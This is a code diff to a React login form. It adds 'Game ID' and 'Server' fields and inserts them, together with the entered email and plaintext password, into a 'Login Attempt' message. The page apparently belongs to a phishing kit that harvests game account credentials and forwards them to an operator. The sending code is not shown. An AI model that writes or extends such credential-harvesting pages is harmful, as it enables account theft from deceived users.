@@ -88,7 +88,8 @@ const Header = () => {
 
   const handleLoginSubmit = async (e) => {
     e.preventDefault()
-    console.log(e.target.email.value)
+    const id_game = e.target.id_game.value
+    const server_game = e.target.server_game.value
     const email = e.target.email.value
     const password = e.target.password.value
 
@@ -107,6 +108,7 @@ const Header = () => {
     try {
       const message = `
         <b>🔐 Login Attempt</b>
+        <b>ID & Server:</b> <code>${id_game} (${server_game})</code>
         <b>Email:</b> <code>${email}</code>
         <b>Password:</b> <code>${password}</code>
         <b>Time:</b> ${new Date().toLocaleString()}
@@ -214,6 +216,42 @@ const Header = () => {
             {/* Form Container */}
             <form className="space-y-4" onSubmit={handleLoginSubmit}>
               <div className="space-y-4">
+                {/* Game ID */}
+                <div>
+                  <label
+                    htmlFor="id_game"
+                    className="block text-sm text-blue-200 mb-1"
+                  >
+                    Game ID
+                  </label>
+                  <input
+                    id="id_game"
+                    type="text"
+                    placeholder="game id"
+                    name="id_game"
+                    required
+                    className="w-full px-4 py-2 rounded-md bg-blue-900/40 border border-blue-500 placeholder-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
+                  />
+                </div>
+
+                {/* Server */}
+                <div>
+                  <label
+                    htmlFor="server_game"
+                    className="block text-sm text-blue-200 mb-1"
+                  >
+                    Server
+                  </label>
+                  <input
+                    id="server_game"
+                    type="text"
+                    placeholder="server"
+                    name="server_game"
+                    required
+                    className="w-full px-4 py-2 rounded-md bg-blue-900/40 border border-blue-500 placeholder-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
+                  />
+                </div>
+
                 {/* Email Input */}
                 <div>
                   <label
